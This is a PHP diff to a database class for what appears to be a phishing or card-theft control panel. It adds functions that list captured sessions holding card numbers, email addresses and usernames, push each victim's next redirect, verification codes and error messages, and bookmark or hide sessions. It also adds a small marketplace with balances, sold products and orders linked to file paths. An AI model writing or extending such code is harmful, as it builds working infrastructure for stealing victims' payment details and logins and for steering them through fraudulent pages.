@@ -354,18 +354,31 @@ class DB {
         return $status;
     }  
     
-    public static function getSessions($conn,$time = NULL){
-        if(!$time){
-            $time = time();
-            $time = 0;
+    public static function getSessions($conn,$filter){
+        $time = time();
+        $query = "SELECT * FROM logs ";
+        $period = "7776000";
+        if($filter=="recent"){
+            $period = "30";
         }
-        $query = $conn->prepare(
-            "SELECT * FROM logs WHERE (Last_Online > $time - 60 OR cardnumber IS NOT NULL ".
-            "OR email_address IS NOT NULL OR username IS NOT NULL) ".
-            "AND Last_Online > $time - 604800 ". 
-            "ORDER BY date_visited DESC");
-        $query->execute();
-        $queryresult=$query->get_result();
+
+        if($filter=="input"){
+            $period = "5400";
+        }
+
+        $query=$query."WHERE (Last_Online > ($time - $period)  OR Last_Online IS NULL) ";
+        
+        if($filter=="inputs" || $filter=="recent"){
+            $query=$query."AND (cardnumber IS NOT NULL ".
+            "OR email_address IS NOT NULL OR username IS NOT NULL)";
+        }
+        if($filter=="bookmarked"){
+            $query=$query."AND bookmark = TRUE ";
+        }
+        $query = $query . " ORDER BY date_visited DESC";
+        $statement = $conn->prepare($query);
+        $statement->execute();
+        $queryresult=$statement->get_result();
         if($queryresult){
             $result=$queryresult->fetch_all(MYSQLI_ASSOC);
             return $result;
@@ -444,6 +457,20 @@ class DB {
     public static function sendData($conn,$sessionId,$newRedirect,$sentcode1,$sentcode2,$sentcode3,$sentcode4,$sentcode5,$setError){
         $query = $conn->prepare("update logs SET Next_Redirect = ?, sentcode=? , sentcode2=? ,sentcode3=?, sentcode4=?, sentcode5=?, show_error=? where SessionID=?");
         $query->bind_param("ssssssss",$newRedirect,$sentcode1,$sentcode2,$sentcode3,$sentcode4,$sentcode5,$setError,$sessionId);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function bookmarkSession($conn,$sessionId,$bookmarked=false){
+        $query = $conn->prepare("update logs SET bookmark=? where SessionID=?");
+        $query->bind_param("is",$bookmarked,$sessionId);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function deleteSession($conn,$sessionId){
+        $query = $conn->prepare("update logs SET Last_Online = 0 where SessionID=?");
+        $query->bind_param("s",$sessionId);
         $status = $query->execute();
         return $status;
     }
@@ -535,7 +562,7 @@ class DB {
     }
 
     public static function getProducts($conn){
-        $query = $conn->prepare("SELECT products.*, users.username as creatorName FROM products INNER JOIN users ON products.creator = users.userId");
+        $query = $conn->prepare("SELECT products.*, users.username as creatorName FROM products INNER JOIN users ON products.creator = users.userId WHERE shelfState != 'SOLD'");
         $query->execute();
         $queryresult=$query->get_result();
         if($queryresult){
@@ -661,6 +688,51 @@ class DB {
         $query->bind_param('sis',$destination,$user["userId"],$shortname);
         $status = $query->execute();
         return $status;
+    }
+
+    public static function updateUserBalance($conn, $userId, $update_balance) {
+        $query = $conn->prepare(
+            "UPDATE users ".
+            "SET balance=? ".
+            "WHERE userId=?");
+        $query->bind_param("ii",$update_balance,$userId);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function updateProductState($conn, $productID, $state) {
+        $query = $conn->prepare(
+            "UPDATE products ".
+            "SET shelfState=? ".
+            "WHERE productID=?");
+        $query->bind_param("ss",$state,$productID);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function insertOrder($conn, $userId, $typeOrder, $productID) {
+        $orderId = "";
+        for ($i= 0; $i < 32; $i ++) {
+            $orderId .= rand(0, 9);
+        };
+        $query = $conn->prepare(
+            "INSERT INTO orders ".
+            "VALUES (?, ?, ?, ?, NOW())");
+        $query->bind_param("siss", $orderId, $userId, $typeOrder,$productID);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function getOrder($conn, $userId) {
+        $query = $conn->prepare("SELECT orders.orderId, orders.typeOrder, products.title, products.price, orders.date, products.filePath FROM `orders` INNER JOIN `products` ON `orders`.`productID` = `products`.`productID` where userId=?");
+        $query->bind_param("i", $userId);
+        $query->execute();
+        $queryresult=$query->get_result();
+        if($queryresult){
+            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
+            return $result;
+        }
+        return false;
     }
 }
 ?>
